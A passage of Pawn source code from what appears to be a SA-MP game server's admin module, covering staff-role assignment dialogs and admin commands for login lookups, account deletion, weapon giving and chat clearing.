								format(string, sizeof(string), "%s has given Business Moderator permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued business moderator");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pBM] = 0;
								SendServerMessage(playerid, "You have taken their Business Moderator");
								SendServerMessage(giveplayerid, "You have had your Business Moderator taken");
								format(string, sizeof(string), "%s has taken Business Moderator permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from business moderator");
								ShowSetSec(playerid, giveplayerid);
							}
					}
					case 8:
					{
							if(PlayerInfo[giveplayerid][pBM] == 0 || PlayerInfo[giveplayerid][pBM] == 1)
							{
								PlayerInfo[giveplayerid][pBM] = 2;
								SendServerMessage(playerid, "You have made them a Director of Business Management");
								SendServerMessage(giveplayerid, "You have been made a Director of Business Management");
								format(string, sizeof(string), "%s has given Director of Business Management permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued Director of Business Management");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pBM] = 0;
								SendServerMessage(playerid, "You have taken their Director of Business Management");
								SendServerMessage(giveplayerid, "You have had your Director of Business Management taken");
								format(string, sizeof(string), "%s has taken Director of Business Management permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from Director of Business Management");
								ShowSetSec(playerid, giveplayerid);
							}
					}
					case 9:
					{
						
						if(PlayerInfo[giveplayerid][pShopTech] == 0)
						{
							PlayerInfo[giveplayerid][pShopTech] = 1;
							SendServerMessage(playerid, "You have made them a Shop Technician");
							SendServerMessage(giveplayerid, "You have been made a Shop Technician");
							format(string, sizeof(string), "%s has given Shop Technician to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued shop tech");
						}
						else
						{
							PlayerInfo[giveplayerid][pShopTech] = 0;
							SendServerMessage(playerid, "You have taken their Shop Technician");
							SendServerMessage(giveplayerid, "You have had your Shop Technician taken");
							format(string, sizeof(string), "%s has taken Shop Technician from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from shop tech");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 10:
					{
						if(PlayerInfo[giveplayerid][pShopTech] == 0)
						{
							PlayerInfo[giveplayerid][pShopTech] = 2;
							SendServerMessage(playerid, "You have made them a Senior Shop Technician");
							SendServerMessage(giveplayerid, "You have been made a Senior Shop Technician");
							format(string, sizeof(string), "%s has given Senior Shop Technician to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued Senior shop tech");
						}
						else
						{
							PlayerInfo[giveplayerid][pShopTech] = 0;
							SendServerMessage(playerid, "You have taken their Senior Shop Technician");
							SendServerMessage(giveplayerid, "You have had your Senior Shop Technician taken");
							format(string, sizeof(string), "%s has taken Senior Shop Technician from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from Senior shop tech");
						}
						ShowSetSec(playerid, giveplayerid);

					}
					case 11:
					{
						if(PlayerInfo[giveplayerid][pShopTech] == 0 || PlayerInfo[giveplayerid][pShopTech] == 1 || PlayerInfo[giveplayerid][pShopTech] == 2)
						{
							PlayerInfo[giveplayerid][pShopTech] = 3;
							SendServerMessage(playerid, "You have made them a DoCR");
							SendServerMessage(playerid, "You have been made a DoCR");
							format(string, sizeof(string), "%s has given DoCR to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued DoCR");
							ShowSetSec(playerid, giveplayerid);
						}
						else
						{
							PlayerInfo[giveplayerid][pShopTech] = 0;
							SendServerMessage(playerid, "You have taken their DoCR");
							SendServerMessage(giveplayerid, "You have had your DoCR taken");
							format(string, sizeof(string), "%s has taken DoCR from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from DoCR");
							ShowSetSec(playerid, giveplayerid);
						}							
					}
					case 12:
					{
						if(PlayerInfo[giveplayerid][pBanAppealer] == 0)
						{
							PlayerInfo[giveplayerid][pBanAppealer] = 1;
							SendServerMessage(playerid, "You have made them a Ban Appealer");
							SendServerMessage(giveplayerid, "You have been made a Ban Appealer");
							format(string, sizeof(string), "%s has given Ban Appealer to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued ban appealer");
						}
						else
						{
							PlayerInfo[giveplayerid][pBanAppealer] = 0;
							SendServerMessage(playerid, "You have taken their Ban Appealer");
							SendServerMessage(giveplayerid, "You have had your Ban Appealer taken");
							format(string, sizeof(string), "%s has taken Ban Appealer from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from ban appealer");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 13:
					{
						if(PlayerInfo[giveplayerid][pBanAppealer] == 0)
						{
							PlayerInfo[giveplayerid][pBanAppealer] = 2;
							SendServerMessage(playerid, "You have made them a DoCI");
							SendServerMessage(giveplayerid, "You have been made a DoCI");
							format(string, sizeof(string), "%s has given Director of DoCI to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued DoCI");
						}
						else
						{
							PlayerInfo[giveplayerid][pBanAppealer] = 0;
							SendServerMessage(playerid, "You have taken their DoCI");
							SendServerMessage(giveplayerid, "You have had your DoCI taken");
							format(string, sizeof(string), "%s has taken DoCI from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from DoCI");
						}
						ShowSetSec(playerid, giveplayerid);

					}
					case 14:
					{
						if(PlayerInfo[giveplayerid][pUndercover] == 0)
						{
							PlayerInfo[giveplayerid][pUndercover] = 1;
							SendServerMessage(playerid, "You have made them a Special Operative");
							SendServerMessage(giveplayerid, "You have been made a Special Operative");
							format(string, sizeof(string), "%s has given Special Operative to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued special ops");
						}
						else
						{
							PlayerInfo[giveplayerid][pUndercover] = 0;
							SendServerMessage(playerid, "You have taken their Special Operative");
							SendServerMessage(giveplayerid, "You have had your Special Operative permissions taken");
							format(string, sizeof(string), "%s has taken Special Operative permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from special ops");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 15:
					{
						if(PlayerInfo[giveplayerid][pUndercover] == 0)
						{
							PlayerInfo[giveplayerid][pUndercover] = 2;
							SendServerMessage(playerid, "You have made them a DoSO");
							SendServerMessage(giveplayerid, "You have been made a DoSO");
							format(string, sizeof(string), "%s has given DoSO to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued DoSO");
						}
						else
						{
							PlayerInfo[giveplayerid][pUndercover] = 0;
							SendServerMessage(playerid, "You have taken their DoSO");
							SendServerMessage(giveplayerid, "You have had your DoSO permissions taken");
							format(string, sizeof(string), "%s has taken DoSO permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from DoSO");
						}
						ShowSetSec(playerid, giveplayerid);
					}
					case 16:
					{
						if(PlayerInfo[giveplayerid][pPR] == 0 || PlayerInfo[giveplayerid][pPR] == 2)
						{
							PlayerInfo[giveplayerid][pPR] = 1;
							SendServerMessage(playerid, "You have made them a member of Public Relations");
							SendServerMessage(giveplayerid, "You have been made a member of Public Relations");
							format(string, sizeof(string), "%s has given Public Relations permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued public relations");
							ShowSetSec(playerid, giveplayerid);
						}
						else
						{
							PlayerInfo[giveplayerid][pPR] = 0;
							SendServerMessage(playerid, "You have taken their Public Relations permissions");
							SendServerMessage(giveplayerid, "You have had your Public Relations permissions taken");
							format(string, sizeof(string), "%s has taken Public Relations permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from public relations");
							ShowSetSec(playerid, giveplayerid);
						}
							
					}
					case 17:
					{
						if(PlayerInfo[giveplayerid][pPR] == 0 || PlayerInfo[giveplayerid][pPR] == 1)
						{
							PlayerInfo[giveplayerid][pPR] = 2;
							SendServerMessage(playerid, "You have made them a Director of Public Relations");
							SendServerMessage(giveplayerid, "You have been made a Director of Public Relations");
							format(string, sizeof(string), "%s has given Director of Public Relations permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued Director of public relations");
							ShowSetSec(playerid, giveplayerid);
						}
						else
						{
							PlayerInfo[giveplayerid][pPR] = 0;
							SendServerMessage(playerid, "You have taken their Director of Public Relations permissions");
							SendServerMessage(giveplayerid, "You have had your Director of Public Relations permissions taken");
							format(string, sizeof(string), "%s has taken Director of Public Relations permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from Director of public relations");
							ShowSetSec(playerid, giveplayerid);
						}
							
					}
					case 18:
					{
							if(PlayerInfo[giveplayerid][pHR] == 0  || PlayerInfo[giveplayerid][pHR] == 2 || PlayerInfo[giveplayerid][pHR] == 3)
							{
								PlayerInfo[giveplayerid][pHR] = 1;
								SendServerMessage(playerid, "You have made them a member of Human Resources");
								SendServerMessage(giveplayerid, "You have been made a member of Human Resources");
								format(string, sizeof(string), "%s has given Human Resources permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued human resources");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pHR] = 0;
								SendServerMessage(playerid, "You have taken their Human Resources permissions");
								SendClientMessage(giveplayerid, COLOR_GREY, "You have had your Human Resources permissions taken");
								format(string, sizeof(string), "%s has taken Human Resources permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from human resources");
								ShowSetSec(playerid, giveplayerid);
							}
					}
					case 19:
					{
							if(PlayerInfo[giveplayerid][pHR] == 0 || PlayerInfo[giveplayerid][pHR] == 1 || PlayerInfo[giveplayerid][pHR] == 3)
							{
								PlayerInfo[giveplayerid][pHR] = 2;
								SendServerMessage(playerid, "You have made them a level 2 member of Human Resources");
								SendServerMessage(giveplayerid, "You have been made a level 2 member of Human Resources");
								format(string, sizeof(string), "%s has given level 2 Human Resources permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued human resources");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pHR] = 0;
								SendServerMessage(playerid, "You have taken their Human Resources permissions");
								SendServerMessage(giveplayerid, "You have had your Human Resources permissions taken");
								format(string, sizeof(string), "%s has taken Human Resources permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from human resources");
								ShowSetSec(playerid, giveplayerid);
							}
					}
					case 20:
					{
						if(PlayerInfo[giveplayerid][pHR] == 0 || PlayerInfo[giveplayerid][pHR] == 1 || PlayerInfo[giveplayerid][pHR] == 2)
						{
							PlayerInfo[giveplayerid][pHR] = 3;
							SendServerMessage(playerid, "You have made them a level 3 member of Human Resources");
							SendServerMessage(giveplayerid, "You have been made a level 3 member of Human Resources");
							format(string, sizeof(string), "%s has given level 3 Human Resources permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "issued human resources");
							ShowSetSec(playerid, giveplayerid);
						}
						else
						{
							PlayerInfo[giveplayerid][pHR] = 0;
							SendServerMessage(playerid, "You have taken their Human Resources permissions");
							SendServerMessage(giveplayerid, "You have had your Human Resources permissions taken");
							format(string, sizeof(string), "%s has taken Human Resources permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
							Log("logs/admin.log", string);
							DBLog(playerid, giveplayerid, "Admin", "removed from human resources");
							ShowSetSec(playerid, giveplayerid);
						}
					}
					case 21:
					{
							if(PlayerInfo[giveplayerid][pSecurity] == 0)
							{
								PlayerInfo[giveplayerid][pSecurity] = 1;
								SendServerMessage(playerid, "You have made them a member of Security");
								SendServerMessage(giveplayerid, "You have been made a member of Security");
								format(string, sizeof(string), "%s has given Security permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued security");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pSecurity] = 0;
								SendServerMessage(playerid, "You have taken their Security permissions");
								SendServerMessage(giveplayerid, "You have had your Security permissions taken");
								format(string, sizeof(string), "%s has taken Security permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from security");
								ShowSetSec(playerid, giveplayerid);
							}
					}
					case 22:
					{
							if(PlayerInfo[giveplayerid][pASM] == 0)
							{
								PlayerInfo[giveplayerid][pASM] = 1;
								SendServerMessage(playerid, "You have made them an Assistant Shift Manager");
								SendServerMessage(giveplayerid, "You have been made an Assistant Shift Manager");
								format(string, sizeof(string), "%s has given Assistant Shift Manager permissions to %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "issued Assistant Shift Manager");
								ShowSetSec(playerid, giveplayerid);
							}
							else
							{
								PlayerInfo[giveplayerid][pASM] = 0;
								SendServerMessage(playerid, "You have taken their Assistant Shift Manager");
								SendServerMessage(giveplayerid, "You have had your Assistant Shift Manager taken");
								format(string, sizeof(string), "%s has taken Assistant Shift Manager permissions from %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
								Log("logs/admin.log", string);
								DBLog(playerid, giveplayerid, "Admin", "removed from Assistant Shift Manager");
								ShowSetSec(playerid, giveplayerid);
							}
					}
				}
			}
			if(!response)
			{
				DeletePVar(playerid, "SettingSec");
			}
		}
	}
	return 0;
}


CMD:administration(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1338 || PlayerInfo[playerid][pHR] >= 2)
	{
		ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION, DIALOG_STYLE_LIST,"{FF0606}Administration", "Staff Section\nPlayers Section\n", "Select", "Exit");
	}
	else SendErrorMessage(playerid, "You are not authorized to use that CMD.");
	return 1;
}

forward OnLastLoginCheck(index);
public OnLastLoginCheck(index)
{
	if(IsPlayerConnected(index))
	{
		new string[128], lastlogin[20], name[24];
		new rows, fields;
		cache_get_row_count(rows);
		cache_get_field_count(fields);
		if(rows)
		{
   			cache_get_value_name(0, "LastLogin", lastlogin, 20);
   			cache_get_value_name(0, "Username", name, MAX_PLAYER_NAME);
			format(string, sizeof(string), "{FF0000}%s's last login date: %s", name, lastlogin);
			SendClientMessageEx(index, COLOR_WHITE, string);
			format(string, sizeof(string), "%s has checked %s's last login", GetPlayerNameEx(index), name);
			Log("logs/logincheck.log", string);
		}
		else
		{
			SendClientMessageEx(index, COLOR_WHITE, "There was an issue with checking the account's last login.");
		}
	}
	return 1;
}
CMD:getlastlogin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
		return 1;
	}

	new query[128], name[MAX_PLAYER_NAME];
	if(sscanf(params, "s", name)) return SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /getlastlogin [Player name]");

	new tmpName[24];
	mysql_escape_string(name, tmpName);

	mysql_format(MainPipeline, query, sizeof(query), "SELECT `Username`, `LastLogin` FROM `accounts` WHERE `Username` = '%s' AND `AdminLevel` <= %d", tmpName, PlayerInfo[playerid][pAdmin]);
	mysql_tquery(MainPipeline, query, "OnLastLoginCheck", "i", playerid);
	return 1;
}
forward OnRegiDateCheck(index);
public OnRegiDateCheck(index)
{
	if(IsPlayerConnected(index))
	{
		new string[128], regidate[20], name[24];
		new rows, fields;
		cache_get_row_count(rows);
		cache_get_field_count(fields);
		if(rows)
		{
   			cache_get_value_name(0, "RegiDate", regidate, 20);
   			cache_get_value_name(0, "Username", name, MAX_PLAYER_NAME);
			format(string, sizeof(string), "{FF0000}%s's register date: %s", name, regidate);
			SendClientMessageEx(index, COLOR_WHITE, string);
			format(string, sizeof(string), "%s has checked %s's register date.", GetPlayerNameEx(index), name);
			Log("logs/logincheck.log", string);
		}
		else
		{
			SendErrorMessage(index, "There was an issue with checking the account's registerdate.");
		}
	}
	return 1;
}
CMD:getregisterdate(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
		return 1;
	}

	new query[128], name[MAX_PLAYER_NAME];
	if(sscanf(params, "s", name)) return SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /getregisterdate [Player name]");

	new tmpName[24];
	mysql_escape_string(name, tmpName);

	mysql_format(MainPipeline, query, sizeof(query), "SELECT `Username`, `RegiDate` FROM `accounts` WHERE `Username` = '%s' AND `AdminLevel` <= %d", tmpName, PlayerInfo[playerid][pAdmin]);
	mysql_tquery(MainPipeline, query, "OnRegiDateCheck", "i", playerid);
	return 1;
}

forward OnDeletePlayer(index);
public OnDeletePlayer(index)
{
	new string[128], name[24];
	GetPVarString(index, "OnDeletePlayer", name, 24);

	if(IsPlayerConnected(index))
	{
		if(cache_affected_rows()) {
			format(string, sizeof(string), "You have successfully deleted %s's account.", name);
			SendClientMessageEx(index, COLOR_WHITE, string);

			format(string, sizeof(string), "AdmCmd: %s's account was deleted by %s", name, GetPlayerNameEx(index));
			Log("logs/deleteacc.log", string);
			format(string, 128, "AdmCmd: %s's account was deleted by %s", name, GetPlayerNameEx(index));
			ABroadCast(COLOR_LIGHTRED,string,99999);
			print(string);
		}
		else {
			format(string, sizeof(string), "There was an issue with deleting %s's account.", name);
			SendClientMessageEx(index, COLOR_WHITE, string);
		}
		DeletePVar(index, "OnDeletePlayer");
	}
	return 1;
}
CMD:deleteaccount(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] != 1338)
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
		return 1;
	}

	new string[128], playername[MAX_PLAYER_NAME];
	if(sscanf(params, "s[24]", playername)) return SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /deleteaccount [player name]");

    new giveplayerid = ReturnUser(playername);
	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
		{
			format(string, sizeof(string), "AdmCmd: %s has been auto-banned, reason: Trying to /deleteaccount a higher admin.", GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW,string,2);
			PlayerInfo[playerid][pBanned] = 1;
            new ip[32];
			GetPlayerIp(giveplayerid,ip,sizeof(ip));
			Kick(giveplayerid);
		}
	}
	else
	{
		new query[128], tmpName[24];

		mysql_escape_string(playername, tmpName);
		mysql_format(MainPipeline, query, sizeof(query), "DELETE FROM `accounts` WHERE `Username`='%s'", tmpName); // AND `id`='%d'
		mysql_tquery(MainPipeline, query, "OnDeletePlayer", "i", playerid);

		SetPVarString(playerid, "OnDeletePlayer", tmpName);

		format(string,sizeof(string),"Attempting to delete %s's account...", tmpName);
		SendClientMessageEx(playerid, COLOR_YELLOW, string);
	}
	return 1;
}

CMD:fws(playerid, params[])
{
  	new giveplayerid, string[124];

	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(sscanf(params, "ud", giveplayerid))
		{
			SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /fws [player]");
			return 1;
		}
		GivePlayerValidWeapon(giveplayerid, 27);
		GivePlayerValidWeapon(giveplayerid, 24);
		GivePlayerValidWeapon(giveplayerid, 31);
		GivePlayerValidWeapon(giveplayerid, 34);
		GivePlayerValidWeapon(giveplayerid, 29);
		SendClientMessageEx(giveplayerid, COLOR_GRAD1, "You received a full weapon set!");
		format(string, sizeof(string), "You have given %s a full weapon set!", GetPlayerNameEx(giveplayerid));
		SendClientMessageEx(playerid, COLOR_GRAD1, string);
		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has gave a full weapon set to %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
		ABroadCast(COLOR_YELLOW, string, 2);
		Log("logs/admingive.log", string);
	}
	else {
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
	}
	return 1;
}
CMD:cc(playerid, params[]) return cmd_clearchat(playerid, params);
CMD:clearchat(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		for(new i = 0; i < 100; i++)
	    {
	        SendClientMessageToAllEx(COLOR_GRAD1, " ");
	    }
	}
    else
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
	}
    return 1;
}
